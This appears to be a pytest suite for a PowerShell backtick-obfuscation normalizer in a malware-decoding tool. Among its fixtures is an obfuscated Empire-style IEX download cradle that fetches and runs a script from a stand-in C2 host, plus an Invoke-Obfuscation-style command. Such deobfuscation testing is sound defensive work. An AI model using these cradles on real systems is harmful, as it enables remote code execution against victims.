"""RC4.5 · PowerShell Backtick / Line-Continuation Normalizer regression suite.

Golden fixtures cover:
    * In-token backtick strip (single, multi-per-token, mixed-case)
    * Line-continuation collapse (Windows CRLF + Unix LF)
    * Legitimate escape preservation (`n / `t / `r / `0 / `\\ / `" / `')
    * Interior-of-string-literal handling (backticks in literals also
      normalize — PS treats them the same at parse time)
    * Combined line-continuation + in-token
    * Realistic malware fragment (Empire / Invoke-Obfuscation)
    * No-op on inputs without backticks
    * @op registration returns correct banner
    * BaseDecoder detect() confidence
"""
from __future__ import annotations
import sys
sys.path.insert(0, "/app/backend")

from operations import run_operation
from decoders import ps_backtick_normalizer as ptb


# ── Golden character-level fixtures ────────────────────────────────
def test_basic_single_backtick():
    out, trace = ptb.normalize_backticks("po`wershell")
    assert out == "powershell"
    assert any(r["step"] == "ps-backtick-inline-strip" for r in trace)


def test_multi_backtick_per_token():
    out, _ = ptb.normalize_backticks("po`we`rs`hell")
    assert out == "powershell"


def test_mixed_case_backtick_iex():
    out, _ = ptb.normalize_backticks("I`E`X")
    assert out == "IEX"


def test_backtick_around_dash_param():
    out, _ = ptb.normalize_backticks("-No`Pro`file")
    assert out == "-NoProfile"


# ── Line continuation ─────────────────────────────────────────────
def test_line_continuation_unix_lf():
    src = "powershell `\n  -NoProfile `\n  -Command 'x'"
    out, trace = ptb.normalize_backticks(src)
    assert out == "powershell -NoProfile -Command 'x'"
    assert any(r["step"] == "ps-backtick-line-continuation" for r in trace)


def test_line_continuation_windows_crlf():
    src = "powershell `\r\n  -NoProfile"
    out, _ = ptb.normalize_backticks(src)
    assert out == "powershell -NoProfile"


# ── Legitimate escape preservation ────────────────────────────────
def test_preserve_backtick_n_newline_escape():
    out, _ = ptb.normalize_backticks('"line1`nline2"')
    assert out == '"line1`nline2"'


def test_preserve_backtick_t_tab_escape():
    out, _ = ptb.normalize_backticks('"col1`tcol2"')
    assert out == '"col1`tcol2"'


def test_preserve_all_legit_escapes():
    for esc in ["n", "t", "r", "0", "a", "b", "f", "v", "\\", "'", '"', "`"]:
        src = f'"pre`{esc}post"'
        out, _ = ptb.normalize_backticks(src)
        assert out == src, f"Legit escape `{esc} was stripped"


# ── Realistic malware fragments ───────────────────────────────────
def test_empire_style_iex_backticks():
    src = "I`E`X (New-`Object Net.`WebClient).DownloadString('http://c2/s.ps1')"
    out, _ = ptb.normalize_backticks(src)
    assert out == "IEX (New-Object Net.WebClient).DownloadString('http://c2/s.ps1')"


def test_invoke_obfuscation_multi_line():
    src = ("po`w`e`rs`hell `\n"
             "  -N`oP`rofile `\n"
             "  -Command \"I`E`X 'evil'\"")
    out, _ = ptb.normalize_backticks(src)
    assert out == "powershell -NoProfile -Command \"IEX 'evil'\""


# ── No-op cases ───────────────────────────────────────────────────
def test_no_backtick_returns_unchanged():
    out, trace = ptb.normalize_backticks("Invoke-Expression 'x'")
    assert out == "Invoke-Expression 'x'"
    assert trace == []


def test_only_legit_escapes_returns_unchanged():
    out, _ = ptb.normalize_backticks('"pre`nmid`ttail"')
    assert out == '"pre`nmid`ttail"'


# ── @op banner ────────────────────────────────────────────────────
def test_op_banner_on_backtick_input():
    banner = run_operation("powershell-backtick-normalize", "I`E`X", {})
    assert "POWERSHELL BACKTICK NORMALIZATION" in banner
    assert "IEX" in banner


def test_op_banner_on_clean_input():
    banner = run_operation("powershell-backtick-normalize", "IEX", {})
    assert banner.startswith("(powershell-backtick-normalize")


# ── BaseDecoder ───────────────────────────────────────────────────
def test_basedecoder_detect_fires_on_backtick():
    from engine.models import AnalysisContext, Fingerprint
    fp = Fingerprint(input_len=10)
    ctx = AnalysisContext()
    r = ptb.PSBacktickNormalizerDecoder().detect("I`E`X", fp, ctx)
    assert r.confidence >= 0.85


def test_basedecoder_detect_ignores_legit_escapes():
    from engine.models import AnalysisContext, Fingerprint
    fp = Fingerprint(input_len=10)
    ctx = AnalysisContext()
    r = ptb.PSBacktickNormalizerDecoder().detect('"a`nb"', fp, ctx)
    assert r.confidence == 0.0
